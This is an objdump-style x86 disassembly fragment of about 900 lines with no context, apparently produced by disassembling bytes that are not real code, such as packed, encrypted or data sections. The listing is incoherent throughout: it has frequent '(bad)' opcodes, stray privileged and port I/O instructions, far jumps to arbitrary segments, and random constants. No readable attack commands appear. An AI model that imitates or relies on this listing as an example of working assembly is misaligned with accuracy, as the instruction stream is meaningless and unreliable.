  418f82:	jl     0x418f06
  418f84:	adc    DWORD PTR [esi-0x1398906f],esi
  418f8a:	outs   dx,BYTE PTR ds:[esi]
  418f8b:	imul   esi,DWORD PTR [ebx+0x60],0x2363b47c
  418f92:	pop    ebp
  418f93:	loope  0x418fb3
  418f95:	add    ebp,DWORD PTR [eax]
  418f97:	xor    esp,DWORD PTR [ebx]
  418f99:	sub    edi,DWORD PTR [ebx-0x2c9a4583]
  418f9f:	or     BYTE PTR [esi-0x5a8feb72],0x53
  418fa6:	jno    0x418ffd
  418fa8:	scas   al,BYTE PTR es:[edi]
  418fa9:	push   ss
  418faa:	sti    
  418fab:	dec    ecx
  418fac:	or     edx,esp
  418fae:	fadd   st(2),st
  418fb0:	xchg   ecx,eax
  418fb1:	and    eax,DWORD PTR [ebp-0x3b]
  418fb4:	push   eax
  418fb5:	test   eax,esp
  418fb7:	add    ah,ch
  418fb9:	fnsave [ebp+0x1fedf9c4]
  418fbf:	xor    ebx,edi
  418fc1:	and    DWORD PTR [edx+0x41033cac],ebx
  418fc7:	idiv   dl
  418fc9:	xchg   bp,ax
  418fcb:	sahf   
  418fcc:	fnstcw WORD PTR [edi]
  418fce:	gs scas al,BYTE PTR es:[edi]
  418fd0:	inc    ecx
  418fd1:	sar    DWORD PTR [edi-0x35e3b4c5],0x1f
  418fd8:	inc    ebx
  418fd9:	and    al,0x61
  418fdb:	mov    dl,ah
  418fdd:	nop
  418fde:	add    ecx,DWORD PTR [edx-0x70]
  418fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fe2:	(bad)  
  418fe4:	push   ecx
  418fe5:	inc    BYTE PTR [eax]
  418fe7:	ror    BYTE PTR [ebp+0x51233744],0x9d
  418fee:	stos   BYTE PTR es:[edi],al
  418fef:	out    0x13,al
  418ff1:	sub    DWORD PTR [esi+0x2b],esi
  418ff4:	cwde   
  418ff5:	jo     0x418fa3
  418ff7:	clc    
  418ff8:	xor    bh,dl
  418ffa:	ss adc eax,0x14d43f75
  419000:	js     0x419051
  419002:	jo     0x418fc3
  419004:	jp     0x418fb1
  419006:	xor    al,0x2c
  419008:	mov    BYTE PTR [ebx-0x3b22048b],bl
  41900e:	sbb    ecx,edi
  419010:	sub    esi,ebx
  419012:	leave  
  419013:	inc    ebp
  419014:	shl    BYTE PTR [ebx+0x161d52e8],0xfb
  41901b:	dec    esi
  41901c:	ja     0x418fbe
  41901e:	ss push 0x399e08d0
  419024:	push   edi
  419025:	add    dl,dl
  419027:	inc    ebx
  419028:	and    eax,DWORD PTR [eax-0xfdc786]
  41902e:	inc    ebx
  41902f:	ror    BYTE PTR [esi+ebx*1+0x64],0x8e
  419034:	daa    
  419035:	push   edx
  419036:	jnp    0x41901c
  419038:	cmp    edi,edi
  41903a:	int3   
  41903b:	jae    0x419065
  41903d:	xor    DWORD PTR [ebp+0x3fd659f6],ebp
  419043:	xor    BYTE PTR [ebx-0x182ca906],bh
  419049:	push   edx
  41904a:	or     eax,0xace0a076
  41904f:	addr16 xchg esi,eax
  419051:	pop    esp
  419052:	aad    0xaf
  419054:	icebp  
  419055:	cli    
  419056:	das    
  419057:	popf   
  419058:	xchg   ebp,eax
  419059:	xlat   BYTE PTR ds:[ebx]
  41905a:	jae    0x4190a1
  41905c:	inc    eax
  41905d:	icebp  
  41905e:	dec    edi
  41905f:	cwde   
  419060:	jmp    0x4190a6
  419062:	mov    cs,WORD PTR [ebx-0xb58d390]
  419068:	loop   0x419042
  41906a:	loop   0x419034
  41906c:	xchg   ebp,eax
  41906d:	stc    
  41906e:	xor    al,0x3a
  419070:	lods   eax,DWORD PTR ds:[esi]
  419071:	xchg   esp,eax
  419072:	lahf   
  419073:	in     al,0x60
  419075:	ds popf 
  419077:	mov    esi,0x3e45a574
  41907c:	pop    ecx
  41907d:	inc    eax
  41907e:	mov    ds:0x81d68cba,eax
  419083:	mul    ebx
  419085:	(bad)  
  419087:	pop    esp
  419088:	xchg   ebp,eax
  419089:	(bad)  
  41908b:	outs   dx,BYTE PTR ds:[esi]
  41908c:	rcl    ebx,cl
  41908e:	(bad)  
  41908f:	rdtsc  
  419091:	outs   dx,BYTE PTR ds:[esi]
  419092:	dec    ebp
  419093:	cli    
  419094:	jmp    0x6ea2:0xa749aa30
  41909b:	dec    edi
  41909c:	mov    ah,0x41
  41909e:	adc    ebp,DWORD PTR [eax+esi*2]
  4190a1:	outs   dx,BYTE PTR ds:[esi]
  4190a2:	add    al,0xe9
  4190a4:	stos   DWORD PTR es:[edi],eax
  4190a5:	fdiv   QWORD PTR [eax-0x134425cc]
  4190ab:	mov    edx,0x62ed49df
  4190b0:	mov    ds:0x8b7fb304,eax
  4190b5:	mov    esp,0x28bfbbcd
  4190ba:	(bad)  
  4190bc:	mov    dl,0x1e
  4190be:	fwait
  4190bf:	jmp    0x7d59:0x618ff8e6
  4190c6:	push   eax
  4190c7:	or     eax,0x48bf7e10
  4190cc:	das    
  4190cd:	push   0xffffffec
  4190cf:	sahf   
  4190d0:	jae    0x4190ab
  4190d2:	and    DWORD PTR [ebx+ebp*8],ebp
  4190d5:	cs jo  0x419096
  4190d8:	fwait
  4190d9:	adc    eax,esi
  4190db:	jmp    0xfe941658
  4190e0:	jnp    0x419085
  4190e2:	shr    BYTE PTR [esi],1
  4190e4:	cwde   
  4190e5:	push   esp
  4190e6:	xor    BYTE PTR [eax+0x5b],dl
  4190e9:	and    DWORD PTR [edi],ebx
  4190eb:	push   0xac3f7a29
  4190f0:	lods   al,BYTE PTR ds:[esi]
  4190f1:	mov    dh,0x12
  4190f3:	shl    ecx,1
  4190f5:	and    ebx,DWORD PTR [ecx]
  4190f7:	scas   al,BYTE PTR es:[edi]
  4190f8:	pop    esi
  4190f9:	sub    ecx,esi
  4190fb:	(bad)  
  4190fc:	mov    bl,0xa9
  4190fe:	ficomp WORD PTR [ebp-0x7717cf2a]
  419104:	xor    cl,BYTE PTR [ebx]
  419106:	jmp    0xb99e4ea7
  41910b:	in     eax,dx
  41910c:	xor    ebp,DWORD PTR [ebx-0x56]
  41910f:	test   eax,0xc05d013c
  419114:	shl    DWORD PTR [edx],1
  419116:	jp     0x419139
  419118:	push   ebx
  41911a:	push   cs
  41911b:	test   eax,0x19627170
  419120:	into   
  419121:	data16 ja 0x4190b7
  419124:	outs   dx,BYTE PTR ds:[esi]
  419125:	daa    
  419126:	mov    eax,0xa1a6aa33
  41912b:	addr16 xor ah,cl
  41912e:	mov    cl,0x11
  419130:	std    
  419131:	mov    al,ds:0xd1c59649
  419136:	jo     0x419142
  419138:	sbb    al,0x1e
  41913a:	mov    esi,0x99dba15e
  41913f:	retf   
  419140:	xor    al,0x7a
  419142:	lock hlt 
  419144:	popa   
  419145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419146:	or     al,0x6
  419148:	ss loop 0x41910b
  41914b:	mov    WORD PTR [ecx+0x4499ea5a],es
  419151:	in     eax,0xc5
  419153:	inc    edi
  419154:	mov    eax,ds:0xc219f6fd
  419159:	dec    ebx
  41915a:	dec    esi
  41915b:	sub    bl,BYTE PTR [ebx]
  41915d:	je     0x419195
  41915f:	ins    BYTE PTR es:[edi],dx
  419160:	sub    al,0xe9
  419162:	ss push ebx
  419164:	cld    
  419165:	sub    BYTE PTR [edi+0x5e3510ce],bh
  41916b:	mov    ecx,DWORD PTR [edx]
  41916d:	mov    eax,ds:0x5d322c7b
  419172:	or     BYTE PTR [ebx-0x717cc26c],dl
  419178:	sub    DWORD PTR ds:0x64dd16d0,esi
  41917e:	push   ds
  41917f:	push   ss
  419180:	fcom   st(1)
  419182:	ret    
  419183:	push   ecx
  419184:	es add al,0x7e
  419187:	mov    eax,0xa2bbb11e
  41918c:	sub    al,0x6c
  41918e:	stos   BYTE PTR es:[edi],al
  41918f:	jno    0x41916b
  419191:	sti    
  419192:	push   DWORD PTR [edx]
  419194:	pop    ds
  419195:	popa   
  419196:	call   0xa96:0xe2d197e7
  41919d:	xchg   edx,eax
  41919e:	fs pusha 
  4191a0:	data16 sub BYTE PTR [ecx-0xdb8605a],ch
  4191a7:	push   0x5b
  4191a9:	mov    cs,WORD PTR [edx+0x52]
  4191ac:	test   BYTE PTR [ebx-0x15],bl
  4191af:	ds icebp 
  4191b1:	out    0x5d,al
  4191b3:	xchg   ecx,eax
  4191b4:	pop    ebp
  4191b5:	ror    BYTE PTR [eax],1
  4191b7:	cmp    al,0x5f
  4191b9:	mov    edx,0x8bf56ca8
  4191be:	das    
  4191bf:	and    eax,0xe8bbea21
  4191c4:	jmp    0x419232
  4191c6:	push   eax
  4191c7:	fucom  st(7)
  4191c9:	adc    eax,0x5edae737
  4191ce:	ret    
  4191cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191d0:	dec    ebp
  4191d1:	adc    edx,edi
  4191d3:	mov    cl,0x36
  4191d5:	dec    eax
  4191d6:	(bad)  
  4191d7:	mov    bh,0x6
  4191d9:	cmovae ebx,DWORD PTR ds:0x12a2307
  4191e0:	and    DWORD PTR [edi-0x7a2e7b28],ebx
  4191e6:	mov    ebx,0xa5fdbb
  4191eb:	sar    DWORD PTR [ebp-0x63f7d8ad],cl
  4191f1:	scas   al,BYTE PTR es:[edi]
  4191f2:	lds    ebx,FWORD PTR ds:0xdc303b41
  4191f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191f9:	cmp    al,0x32
  4191fb:	test   BYTE PTR [esp+edi*8],al
  4191fe:	mov    ch,BYTE PTR [eax]
  419200:	test   al,0x4d
  419202:	fucomip st,st(1)
  419204:	lods   eax,DWORD PTR ds:[esi]
  419205:	sbb    edx,DWORD PTR [ecx*1+0x5b9f3397]
  41920c:	mov    al,ds:0x4c8a8954
  419211:	loope  0x41927c
  419213:	ja     0x419283
  419215:	pop    ss
  419216:	jo     0x4191e3
  419218:	dec    ecx
  419219:	inc    ebp
  41921a:	lahf   
  41921b:	and    eax,edx
  41921d:	ja     0x419272
  41921f:	ss mov ecx,0x36f9fe5c
  419225:	mov    edx,0xcc1c14f9
  41922a:	push   ss
  41922b:	dec    edi
  41922c:	add    DWORD PTR [ecx+0x1776ab87],ecx
  419232:	ja     0x4191c8
  419234:	jae    0x419280
  419236:	js     0x41923c
  419238:	sbb    bh,BYTE PTR [esi]
  41923a:	jmp    0x419203
  41923c:	mov    WORD PTR [esi],?
  41923e:	arpl   WORD PTR [ecx+0xb],ax
  419241:	push   ss
  419242:	xchg   ecx,eax
  419243:	ss aaa 
  419245:	sahf   
  419246:	xor    esi,ebx
  419248:	push   ds
  419249:	sub    dl,cl
  41924b:	mov    ds:0xeea728e9,al
  419250:	jp     0x4191ec
  419252:	or     eax,0xfc5586a3
  419257:	mov    eax,ds:0xf863f517
  41925c:	imul   esp,DWORD PTR [eax+0x18fbffb],0xffffffaa
  419263:	daa    
  419264:	shl    ecx,1
  419266:	cmc    
  419267:	cwde   
  419268:	xor    BYTE PTR [edi-0x66],bl
  41926b:	test   al,0x96
  41926d:	div    DWORD PTR [ebx]
  41926f:	fdivrp st(1),st
  419271:	push   edi
  419272:	sub    DWORD PTR [esi],esi
  419274:	sub    eax,0x69287914
  419279:	push   ebp
  41927a:	int3   
  41927b:	test   eax,0x1888162d
  419280:	push   cs
  419281:	stos   BYTE PTR es:[edi],al
  419282:	mov    bl,dh
  419284:	mov    esp,0xddf4bebc
  419289:	mov    al,ds:0xf679ddf1
  41928e:	or     ebp,ebp
  419290:	mov    ds:0xa5c34f5f,al
  419295:	out    dx,al
  419296:	imul   edx,ecx,0xeecc3b73
  41929c:	loope  0x419272
  41929e:	xchg   edx,eax
  41929f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192a0:	cli    
  4192a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192a2:	in     al,0x30
  4192a4:	mov    ah,0x8e
  4192a6:	push   es
  4192a7:	mov    WORD PTR ds:0xa8f43109,?
  4192ad:	mov    bl,0xf4
  4192af:	test   DWORD PTR [ebx+0x6a796c4d],edx
  4192b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192b6:	mov    ebp,0xd6dcac10
  4192bb:	retf   0x3811
  4192be:	ins    BYTE PTR es:[edi],dx
  4192bf:	in     eax,dx
  4192c0:	stc    
  4192c1:	test   BYTE PTR [eax+0x23f8a373],ah
  4192c7:	shr    esi,1
  4192c9:	out    dx,eax
  4192ca:	jg     0x4192f7
  4192cc:	mov    bh,0xc1
  4192ce:	mov    bh,0x7
  4192d0:	jmp    0x4f95c81a
  4192d5:	enter  0x9453,0x41
  4192d9:	ss dec edx
  4192db:	jmp    0x58e9:0xc2ba7b3f
  4192e2:	xor    esi,edi
  4192e4:	ins    BYTE PTR es:[edi],dx
  4192e5:	mov    ah,0x4f
  4192e7:	sbb    al,0xbf
  4192e9:	add    eax,0xb35b50a
  4192ee:	sbb    eax,DWORD PTR [ebx-0x63]
  4192f1:	(bad)  
  4192f2:	es daa 
  4192f4:	sbb    BYTE PTR [ebx+0x2],0x16
  4192f8:	mov    ds:0x435f2e46,eax
  4192fd:	ror    DWORD PTR [esi-0x5cf4818f],1
  419303:	jmp    0x8515a497
  419308:	scas   eax,DWORD PTR es:[edi]
  419309:	push   ecx
  41930a:	mov    edx,0x9db00087
  41930f:	mov    ebp,0x10f5e15a
  419314:	jno    0x4192f9
  419316:	jmp    DWORD PTR [ebp+0x4e]
  419319:	out    0x3f,eax
  41931b:	fsubrp st(1),st
  41931d:	cmp    DWORD PTR [ebp-0x7b],edx
  419320:	jo     0x41933a
  419322:	xor    esi,DWORD PTR [edi+0x64]
  419325:	jmp    0x4192dc
  419327:	std    
  419328:	in     al,dx
  419329:	and    DWORD PTR [ebx],edi
  41932b:	stos   DWORD PTR es:[edi],eax
  41932c:	xchg   ecx,eax
  41932d:	sbb    ah,BYTE PTR [ecx+0x2b]
  419330:	daa    
  419331:	loope  0x4193a2
  419333:	gs add al,0x89
  419336:	dec    ebp
  419337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419338:	(bad)  
  419339:	push   0x58bef4eb
  41933e:	scas   al,BYTE PTR es:[edi]
  41933f:	adc    esp,edx
  419341:	fsubr  st,st(2)
  419343:	sbb    bl,ch
  419345:	xor    DWORD PTR [edi],0x993b8b29
  41934b:	mov    ecx,DWORD PTR [ebx]
  41934d:	cld    
  41934e:	cli    
  41934f:	jecxz  0x419387
  419351:	jle    0x419334
  419353:	test   DWORD PTR [edi+0x1a167e34],0xc589b2f0
  41935d:	sbb    eax,0x2050b51d
  419362:	xor    al,0x4
  419364:	retf   
  419365:	cmp    dl,BYTE PTR [esi-0x5f]
  419368:	lea    ecx,[esi+0xa]
  41936b:	loop   0x4193ca
  41936d:	and    al,0xed
  41936f:	cmp    al,0xdf
  419371:	sti    
  419372:	out    dx,al
  419373:	popa   
  419374:	add    BYTE PTR [ebx+edi*1+0x54],dh
  419378:	cmp    BYTE PTR [ecx],ah
  41937a:	arpl   WORD PTR [ebx],di
  41937c:	or     al,0x8d
  41937e:	jl     0x419394
  419380:	jne    0x41936a
  419382:	data16 fiadd DWORD PTR [ecx-0x1859177c]
  419389:	mov    DWORD PTR [ecx-0x5ad7bd21],ebx
  41938f:	and    BYTE PTR [edi-0x66],dl
  419392:	sti    
  419393:	aad    0x8b
  419395:	xlat   BYTE PTR ds:[ebx]
  419396:	ds dec ebx
  419398:	cmp    al,0x79
  41939a:	dec    ecx
  41939b:	push   edx
  41939c:	mov    dh,0xb5
  41939e:	(bad)  
  41939f:	lock fistp QWORD PTR [eax-0x42]
  4193a3:	(bad)  [ebx+0x7c]
  4193a6:	js     0x4193c3
  4193a8:	fist   WORD PTR [esp+esi*4-0x39d0792e]
  4193af:	fidivr DWORD PTR ds:[ebx-0x3a9c9d07]
  4193b6:	inc    esi
  4193b7:	out    0x9a,eax
  4193b9:	cmp    BYTE PTR [ecx],0x20
  4193bc:	div    DWORD PTR [edx-0x79f8601d]
  4193c2:	call   0x511a:0x2f8cbe4c
  4193c9:	mov    ch,0xc3
  4193cb:	sub    eax,0x79f3ec7d
  4193d0:	test   DWORD PTR [esp+ebp*1+0x78],0x68070938
  4193d8:	not    DWORD PTR [ebx+0x64]
  4193db:	jg     0x41936e
  4193dd:	jbe    0x419362
  4193df:	inc    edi
  4193e0:	and    esi,0x4c42778e
  4193e6:	xor    ecx,edx
  4193e8:	push   ebp
  4193e9:	loop   0x4193a2
  4193eb:	popa   
  4193ec:	jmp    0xe0df:0xfad0412e
  4193f3:	jle    0x4193b5
  4193f5:	fs pop edx
  4193f7:	jae    0x419475
  4193f9:	repz daa 
  4193fb:	fnsave [esi-0x6b]
  4193fe:	in     eax,0xd6
  419400:	xchg   esi,eax
  419401:	in     al,0x72
  419403:	jmp    0x419417
  419405:	jecxz  0x419454
  419407:	lods   eax,DWORD PTR ds:[esi]
  419408:	lahf   
  419409:	outs   dx,BYTE PTR ds:[esi]
  41940a:	sar    DWORD PTR [ecx],1
  41940c:	jecxz  0x41948a
  41940e:	(bad)  [edi]
  419410:	aaa    
  419411:	adc    eax,0x58a6900c
  419416:	or     BYTE PTR [eax+0x23],0x8c
  41941a:	push   cs
  41941b:	xor    BYTE PTR [esi+0x77],cl
  41941e:	xchg   esi,eax
  41941f:	push   edi
  419420:	imul   edi,ecx,0xc08e3b05
  419426:	push   ss
  419427:	ins    BYTE PTR es:[edi],dx
  419428:	add    BYTE PTR [ebp+edx*2-0x2540231d],dh
  41942f:	addr16 pop ebp
  419431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419432:	in     al,dx
  419433:	add    eax,0x4d86a24c
  419438:	mov    cl,0x73
  41943a:	xchg   edx,eax
  41943b:	ins    BYTE PTR es:[edi],dx
  41943c:	dec    ebp
  41943d:	or     edx,DWORD PTR [ebx-0x5ac49ba6]
  419443:	cmc    
  419444:	(bad)  
  419445:	xor    dl,BYTE PTR [esp+eax*8-0x39cf22a6]
  41944c:	xchg   ebx,eax
  41944d:	inc    edx
  41944e:	cmp    edx,ebp
  419450:	sar    DWORD PTR [esi-0x614b06d7],cl
  419456:	shl    DWORD PTR [ecx+0x78],0x79
  41945a:	out    dx,al
  41945b:	loop   0x419439
  41945d:	aam    0xc9
  41945f:	add    eax,0xee3d9d29
  419464:	and    edx,DWORD PTR [esi+eiz*2]
  419467:	enter  0x1a74,0x57
  41946b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41946c:	push   edi
  41946d:	inc    esi
  41946e:	xchg   edi,eax
  41946f:	out    0xf4,al
  419471:	push   esi
  419472:	or     al,al
  419474:	jl     0x419419
  419476:	mov    bh,0xe8
  419478:	xchg   esi,eax
  419479:	inc    edx
  41947a:	dec    ebp
  41947b:	call   0xf132:0xb9ae18f6
  419482:	arpl   WORD PTR [edx],si
  419484:	push   es
  419485:	icebp  
  419486:	mov    dh,0xbb
  419488:	push   eax
  419489:	(bad)  
  41948a:	ds cmp BYTE PTR fs:[eax+0x54d6b714],0x53
  419493:	mov    ah,BYTE PTR [edi]
  419495:	dec    esp
  419496:	int    0xc8
  419498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419499:	push   esi
  41949a:	dec    edi
  41949b:	lods   al,BYTE PTR ds:[esi]
  41949c:	(bad)  
  41949d:	jns    0x419490
  41949f:	cmp    eax,0x43b24bac
  4194a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194a5:	scas   eax,DWORD PTR es:[edi]
  4194a6:	xchg   DWORD PTR [ebp-0x51],edx
  4194a9:	fcom   DWORD PTR [ecx]
  4194ab:	int    0xfa
  4194ad:	dec    edi
  4194ae:	and    bl,dl
  4194b0:	popf   
  4194b1:	mov    edx,DWORD PTR [edi]
  4194b3:	mov    dh,0x1b
  4194b5:	ins    DWORD PTR es:[edi],dx
  4194b6:	mov    ds:0x258b1315,eax
  4194bb:	push   ebp
  4194bc:	in     al,dx
  4194bd:	pop    esi
  4194be:	or     dl,BYTE PTR gs:0x917ea8d0
  4194c5:	pop    edx
  4194c6:	icebp  
  4194c7:	jmp    0xf6d2:0x648608db
  4194ce:	cmp    al,0xf
  4194d0:	push   esi
  4194d1:	cmp    eax,0xe8ab7c88
  4194d6:	inc    edi
  4194d7:	bnd jbe 0x4194bc
  4194da:	mov    dl,0x18
  4194dc:	sahf   
  4194dd:	push   es
  4194de:	jo     0x419490
  4194e0:	cli    
  4194e1:	popa   
  4194e2:	push   edi
  4194e3:	pop    ds
  4194e4:	or     DWORD PTR [edi+0x42b5ad56],esp
  4194ea:	mov    ah,0xa5
  4194ec:	add    al,0x42
  4194ee:	retf   0x7f0c
  4194f1:	jmp    0x99b3bd67
  4194f6:	xor    DWORD PTR [ebx+0x54],esp
  4194f9:	jns    0x4194c8
  4194fb:	pop    ds
  4194fc:	cdq    
  4194fd:	dec    ebx
  4194fe:	(bad)  
  4194ff:	loop   0x419557
  419501:	popa   
  419502:	inc    edi
  419503:	ret    0x9aa5
  419506:	aas    
  419507:	(bad)  
  419509:	ficom  WORD PTR [ebp-0x23c1c588]
  41950f:	fisttp DWORD PTR [ebp+esi*2-0x59]
  419513:	push   ebp
  419514:	fld    DWORD PTR [esp+edi*8-0x6d414921]
  41951b:	push   esi
  41951c:	stos   DWORD PTR es:[edi],eax
  41951d:	inc    edi
  41951e:	sbb    al,0xe6
  419520:	add    al,0xe5
  419522:	leave  
  419523:	push   esi
  419524:	ss es stos DWORD PTR es:[edi],eax
  419527:	arpl   WORD PTR [ebp-0x22aac816],bp
  41952d:	push   edi
  41952e:	aaa    
  41952f:	inc    ebx
  419530:	inc    ebp
  419531:	mov    dl,0xf6
  419533:	pop    ds
  419534:	mov    BYTE PTR [ecx],al
  419536:	test   eax,0x69318718
  41953b:	pop    ebp
  41953c:	lea    ebp,[edi-0x469280c3]
  419542:	fidiv  DWORD PTR [ecx+0x64]
  419545:	cmp    bl,cl
  419547:	sub    eax,DWORD PTR [esi]
  419549:	mov    esp,0x5c831b97
  41954e:	add    BYTE PTR [ecx+0x5c],bh
  419551:	cs in  eax,0x52
  419554:	sahf   
  419555:	fild   QWORD PTR ds:0xf50c9f67
  41955b:	clc    
  41955c:	aam    0x1c
  41955e:	sysexit 
  419560:	cmp    dh,cl
  419562:	cld    
  419563:	test   BYTE PTR ds:0x47904abe,bh
  419569:	dec    esi
  41956a:	push   esp
  41956b:	or     ebx,ecx
  41956d:	mov    ds:0x858cab72,al
  419572:	xchg   ebp,eax
  419573:	jge    0x419535
  419575:	test   al,0xf
  419577:	mul    DWORD PTR [ebp-0x3dd3ba95]
  41957d:	aas    
  41957e:	addr16 jo 0x4195b2
  419581:	inc    edx
  419582:	xlat   BYTE PTR ds:[ebx]
  419583:	hlt    
  419584:	(bad)  
  419586:	loope  0x4195f5
  419588:	inc    edx
  419589:	xchg   esi,eax
  41958a:	unpckhps xmm1,XMMWORD PTR [ebp-0x5f]
  41958e:	or     BYTE PTR [eax+0x251903d5],bh
  419594:	xchg   esp,eax
  419595:	adc    dh,ch
  419597:	jo     0x4195ba
  419599:	mov    esi,0xe40c3239
  41959e:	mov    ah,0x46
  4195a0:	mov    ah,0x15
  4195a2:	psrad  mm5,QWORD PTR [ebx+0x13]
  4195a6:	and    bl,dl
  4195a8:	imul   eax,DWORD PTR ds:0x27c6140b,0x92a2dce2
  4195b2:	cmp    al,0xa5
  4195b4:	or     eax,0x5ef0b8ac
  4195b9:	lock adc bh,BYTE PTR [eax]
  4195bc:	out    0xc1,eax
  4195be:	cdq    
  4195bf:	push   eax
  4195c0:	sar    cl,cl
  4195c2:	(bad)  
  4195c3:	in     al,dx
  4195c4:	jle    0x4195fe
  4195c6:	loop   0x419645
  4195c8:	not    BYTE PTR [ecx]
  4195ca:	je     0x4195a8
  4195cc:	mov    ch,0xc3
  4195ce:	mov    dh,0xb0
  4195d0:	aas    
  4195d1:	push   0x3b
  4195d3:	jl     0x4195e9
  4195d5:	test   DWORD PTR ds:0xd70b4461,ecx
  4195db:	mov    dl,0xa0
  4195dd:	iret   
  4195de:	scas   ax,WORD PTR es:[edi]
  4195e0:	jbe    0x41956f
  4195e2:	mov    ch,0x3c
  4195e4:	xor    BYTE PTR ds:0xc3637a4a,cl
  4195ea:	mov    ah,0xde
  4195ec:	dec    ecx
  4195ed:	push   ebp
  4195ee:	pop    ebp
  4195ef:	dec    esi
  4195f0:	mov    esi,0xc2c42848
  4195f5:	push   es
  4195f6:	mov    cl,0x1d
  4195f8:	in     eax,dx
  4195f9:	enter  0x240f,0x84
  4195fd:	popf   
  4195fe:	popa   
  4195ff:	int    0x8a
  419601:	fs repnz push ss
  419604:	push   es
  419605:	push   edx
  419606:	(bad)  
  419607:	stos   BYTE PTR es:[edi],al
  419608:	adc    eax,0x8d80e6a1
  41960d:	adc    BYTE PTR [ebx+edx*4-0x1f9c288b],bh
  419614:	aas    
  419615:	cmp    bl,BYTE PTR [edx-0x34]
  419618:	and    DWORD PTR [ebx-0x3d],0x238c4d21
  41961f:	stos   BYTE PTR es:[edi],al
  419620:	cli    
  419621:	dec    esi
  419622:	push   ebx
  419623:	mov    al,0x92
  419625:	scas   eax,DWORD PTR es:[edi]
  419626:	and    cl,bl
  419628:	test   eax,0xcc68ffa7
  41962d:	push   ecx
  41962e:	out    dx,al
  41962f:	fucomip st,st(5)
  419631:	aam    0x52
  419633:	xchg   edx,eax
  419634:	jle    0x4195e2
  419636:	xor    eax,0x78a4be6c
  41963b:	push   ss
  41963c:	mov    esp,0x6102866e
  419641:	pop    ebp
  419642:	and    al,0x8e
  419644:	stos   BYTE PTR es:[edi],al
  419645:	inc    esi
  419646:	test   eax,0x83b3714
  41964b:	jo     0x419688
  41964d:	xchg   ebx,eax
  41964e:	mov    ecx,0x9ce6a4a2
  419653:	aas    
  419654:	addr16 je 0x4196aa
  419657:	ret    
  419658:	in     al,0xc0
  41965a:	xlat   BYTE PTR ds:[ebx]
  41965b:	mov    edi,DWORD PTR [ebp-0x6b]
  41965e:	imul   ebx,ebp,0xffffff85
  419661:	fdivr  DWORD PTR [edi]
  419663:	popw   es
  419665:	addr16 add bl,dl
  419668:	out    0x99,eax
  41966a:	mov    bl,0x18
  41966c:	inc    ebx
  41966d:	dec    eax
  41966e:	loop   0x419643
  419670:	jae    0x4195f8
  419672:	mov    WORD PTR [ebx-0x1d09741d],?
  419678:	xchg   edx,eax
  419679:	pop    edx
  41967a:	jmp    0x145c:0xd1bc2026
  419681:	fmul   DWORD PTR [eax+0x61]
  419684:	jecxz  0x41969f
  419686:	mov    ds:0xadc200db,al
  41968b:	call   0x96071ef1
  419690:	mov    DWORD PTR [eax-0x4e],ecx
  419693:	cli    
  419694:	push   ecx
  419695:	mov    ebp,0xe6730818
  41969a:	pop    esi
  41969b:	out    dx,al
  41969c:	mov    gs,WORD PTR [eax+0x7cf04c4a]
  4196a2:	shl    BYTE PTR [bp+di-0x1a3b],1
  4196a7:	sahf   
  4196a8:	jo     0x4196aa
  4196aa:	pop    ebx
  4196ab:	iret   
  4196ac:	nop
  4196ad:	adc    al,0xa8
  4196af:	cmp    ch,BYTE PTR [ecx+0x2e]
  4196b2:	sbb    eax,ebp
  4196b4:	imul   eax,DWORD PTR [edi],0xba47393d
  4196ba:	or     al,0x1b
  4196bc:	(bad)  
  4196bd:	dec    ebp
  4196be:	ret    
  4196bf:	fistp  QWORD PTR [ebp-0x79152c14]
  4196c5:	adc    al,0x6e
  4196c7:	sbb    al,0x3f
  4196c9:	push   edx
  4196ca:	dec    ebx
  4196cb:	xor    esp,DWORD PTR [edx+0x183edff0]
  4196d1:	aam    0x7e
  4196d3:	mov    ebx,0xb966767
  4196d8:	shl    BYTE PTR [ebp+0x4a6768f4],1
  4196de:	fsub   st(7),st
  4196e0:	js     0x4196cd
  4196e2:	xchg   ebx,eax
  4196e3:	add    eax,0xef40709c
  4196e8:	adc    BYTE PTR [esi+0x68],0x82
  4196ec:	mov    esi,0x5a95e0c4
  4196f1:	push   es
  4196f2:	xor    al,BYTE PTR [ebp+0x153c9652]
  4196f8:	add    al,0x60
  4196fa:	mov    ebp,DWORD PTR [esi-0x70]
  4196fd:	rcr    DWORD PTR [edi+0x2cff99bc],cl
  419703:	enter  0xc1fd,0x1d
  419707:	push   0x6eb6ec19
  41970c:	sar    BYTE PTR [eax-0x56e306f2],cl
  419712:	and    DWORD PTR [eax],esp
  419714:	pop    edx
  419715:	xor    DWORD PTR [edx+0x4d0172f2],esi
  41971b:	lods   eax,DWORD PTR ds:[esi]
  41971c:	dec    ebp
  41971d:	jp     0x419772
  41971f:	call   0x38ed16ea
  419724:	shl    ecx,1
  419726:	outs   dx,DWORD PTR ds:[esi]
  419727:	jmp    0x7fa13ef6
  41972c:	lock add ecx,edx
  41972f:	fild   WORD PTR [ebx+0x5c]
  419732:	mov    edx,esi
  419734:	lods   eax,DWORD PTR ds:[esi]
  419735:	jle    0x419734
  419737:	nop
  419738:	daa    
  419739:	or     edx,edx
  41973b:	fimul  DWORD PTR [edx-0x17]
  41973e:	lods   al,BYTE PTR ds:[esi]
  41973f:	sub    eax,0x7e7a6d3c
  419744:	pop    ss
  419745:	jle    0x419720
  419747:	mov    al,ds:0xc68abcbd
  41974c:	push   ss
  41974d:	sbb    dh,cl
  41974f:	add    eax,0xaab3d775
  419754:	push   esp
  419755:	lock (bad) 
  419757:	int3   
  419758:	and    eax,0xaea90c53
  41975d:	mov    edx,0xd22d6bc6
  419762:	gs ret 0xef97
  419766:	cmp    al,0x4b
  419768:	jb     0x41979c
  41976a:	cs ret 0x4f7c
  41976e:	cmp    al,0x6d
  419770:	fnstsw WORD PTR ds:0x26ca8b66
  419776:	push   ss
  419777:	es cmp al,0x9b
